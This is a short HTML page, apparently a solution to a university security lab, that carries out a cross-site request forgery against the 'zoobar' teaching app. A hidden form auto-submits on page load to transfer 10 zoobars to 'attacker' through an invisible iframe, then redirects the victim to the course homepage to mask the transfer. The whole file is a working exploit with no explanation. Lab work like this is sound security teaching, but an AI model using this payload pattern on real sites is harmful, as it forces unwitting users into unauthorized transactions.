<!DOCTYPE html>
<html>
<head>
    <title>CSRF</title>
	<style>
	.hidden{
		display: none;
	}
	</style>
</head>
<body>
<form id="form" class="hidden" action="http://zoobar.csl.toronto.edu/transfer.php" method="POST" target="container">
    <input type="text" name="zoobars" value="10"/>
    <input type="text" name="zb_recipient" value="attacker"/>
    <input type="hidden" name="submission" value="Send"/>
</form>
<iframe id="container" class="hidden" name="container" width="100%" height="500px"></iframe>

<script src="jquery-1.11.3.min.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
		$("#container").on("load", function(){
			window.location.href= "http://ece568.csl.toronto.edu/";
		});
        $("#form").submit();
    });
</script>
</body>
</html>
